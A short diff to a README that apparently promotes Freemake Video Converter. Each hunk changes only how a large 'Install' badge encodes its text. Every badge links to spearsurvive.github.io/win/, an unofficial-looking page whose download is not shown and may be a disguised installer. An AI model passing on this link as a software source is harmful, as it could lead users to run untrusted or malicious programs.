@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Freemake Video Converter](https://img.shields.io/badge/⬇_Install_Freemake%20Video%20Converter-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Freemake Video Converter](https://img.shields.io/badge/⬇_Install_Freemake+Video+Converter-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Freemake Video Converter is a Windows video converter and DVD burner supporting 
 
 <div align="center">
 
-[![⬇ Install Freemake Video Converter](https://img.shields.io/badge/⬇_Install_Freemake%20Video%20Converter-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Freemake Video Converter](https://img.shields.io/badge/⬇_Install_Freemake+Video+Converter-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Freemake Video Converter is a Windows video converter and DVD burner supporting 
 
 <div align="center">
 
-[![⬇ Install Freemake Video Converter](https://img.shields.io/badge/⬇_Install_Freemake%20Video%20Converter-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Freemake Video Converter](https://img.shields.io/badge/⬇_Install_Freemake+Video+Converter-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
